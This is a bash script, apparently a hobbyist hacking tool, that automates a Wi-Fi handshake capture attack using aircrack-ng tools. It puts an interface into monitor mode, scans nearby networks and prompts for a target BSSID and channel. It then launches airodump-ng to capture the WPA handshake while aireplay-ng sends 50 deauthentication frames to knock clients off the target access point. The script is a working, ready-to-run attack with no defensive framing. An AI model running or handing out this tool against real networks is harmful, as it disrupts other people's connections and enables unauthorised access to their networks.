#!/bin/bash
#Edited By 9yon6yon-6yon
loading() {
clear
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Run as super user, e.g.\e[0m\e[1;96m sudo bash filename.sh \e[1;93m or\e[0m \e[0m\e[1;96m./filename.sh\n"
sleep 2
clear
printf "\e[1;92m"
printf "\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n"
sleep 0.1
clear
printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ Loading ...\n"
sleep 0.1
}
loading
clear
#see current interfaces
ifconfig
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an interface: \e[0m\e[1;96m\en' interface
#starting monitor mode
airmon-ng check kill
clear
sleep 0.5
printf "\nStarting monitor mode .\n"
sleep 0.75
clear 
printf "\nStarting monitor mode ..\n"
sleep 0.75
clear 
printf "\nStarting monitor mode ...\n"
sleep 0.75
clear
airmon-ng start $interface
mode="${interface}mon"
sleep 2
#discover wifi networks
airodump-ng $mode
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Enter BSSID               : \e[0m\e[1;96m\en' bssid
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Enter Channel             : \e[0m\e[1;96m\en' ch
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Enter Handshake File Name : \e[0m\e[1;96m\en' f_name
sleep 3
gnome-terminal -e "airodump-ng -c $ch --bssid $bssid -w $f_name $mode" --geometry=80x22+10
gnome-terminal -e "aireplay-ng -0 50 -a $bssid $mode" --geometry=80*22+0+500
sleep 2 
stop(){
#stoping monitor mode
clear
sleep 0.1
printf "\nStoping monitor mode .\n"
sleep 0.75
clear 
printf "\nStoping monitor mode ..\n"
sleep 0.75
clear 
printf "\nStoping monitor mode ...\n"
sleep 0.75
clear
airmon-ng stop $mode
sleep 0.1
clear
#restarting network manager to managed mode
sleep 0.1
printf "\nRestarting network manager .\n"
sleep 0.75
clear 
printf "\nRestarting network manager ..\n"
sleep 0.75
clear 
printf "\nRestarting network manager ...\n"
sleep 0.75
clear
service network-manager restart
clear
exit
}
while true; do
printf "\nPress \e[1;93m q\e[0m \e[0m\e[1;96m to stop monitor mode\n"
read -r input
if [ "$input" = "q" ];then
stop
fi 
done